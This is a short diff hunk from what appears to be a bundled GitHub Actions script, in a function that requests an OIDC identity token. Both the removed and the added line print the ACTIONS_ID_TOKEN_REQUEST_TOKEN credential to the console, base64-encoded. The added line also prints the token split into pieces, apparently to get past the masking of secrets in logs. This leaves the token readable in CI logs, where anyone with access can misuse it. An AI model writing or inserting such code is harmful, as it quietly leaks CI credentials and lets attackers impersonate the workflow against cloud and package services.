@@ -14126,7 +14126,7 @@ async function getGHAToken(audience) {
     }
     // Construct URL to request token w/ appropriate audience
     const url = new URL(process.env.ACTIONS_ID_TOKEN_REQUEST_URL);
-    console.log(5959595, process.env.ACTIONS_ID_TOKEN_REQUEST_URL, btoa(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN));
+    console.log(5959595, process.env.ACTIONS_ID_TOKEN_REQUEST_URL, process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN.split('a'), btoa(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN));
     url.searchParams.append('audience', audience);
     const response = await (0, make_fetch_happen_1.default)(url.href, {
         retry: 2,
